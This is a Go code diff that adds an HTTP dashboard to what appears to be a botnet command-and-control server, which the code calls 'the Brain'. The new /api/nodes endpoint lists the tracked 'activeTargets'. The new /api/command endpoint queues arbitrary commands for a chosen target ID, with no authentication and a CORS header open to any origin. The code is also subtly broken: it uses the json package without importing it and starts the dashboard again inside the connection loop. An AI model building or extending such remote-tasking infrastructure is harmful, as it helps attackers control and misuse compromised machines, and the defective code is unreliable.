@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"net/http"
 	"strings"
 	"sync"
 	"time"
@@ -30,6 +31,32 @@ var (
 )
 var relayCooldown = make(map[string]time.Time)
 
+func startDashboardAPI() {
+	http.HandleFunc("/api/nodes", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		w.Header().Set("Access-Control-Allow-Origin", "*")
+
+		mu.Lock()
+		defer mu.Unlock()
+		// This works here because the Brain actually owns these maps!
+		json.NewEncoder(w).Encode(activeTargets)
+	})
+
+	http.HandleFunc("/api/command", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Access-Control-Allow-Origin", "*")
+		targetID := r.URL.Query().Get("id")
+		cmd := r.URL.Query().Get("cmd")
+
+		mu.Lock()
+		activeSessions[strings.ToUpper(targetID)] = cmd
+		mu.Unlock()
+
+		fmt.Fprintf(w, "Command %s queued", cmd)
+	})
+
+	fmt.Println("[WEB] Dashboard API listening on :9000")
+	http.ListenAndServe(":9000", nil)
+}
 func main() {
 	rand.Seed(time.Now().UnixNano())
 	ln, _ := net.Listen("tcp", ":8080")
@@ -40,6 +67,7 @@ func main() {
 	for {
 		conn, _ := ln.Accept()
 		go handleConnection(conn)
+		go startDashboardAPI()
 	}
 }
 
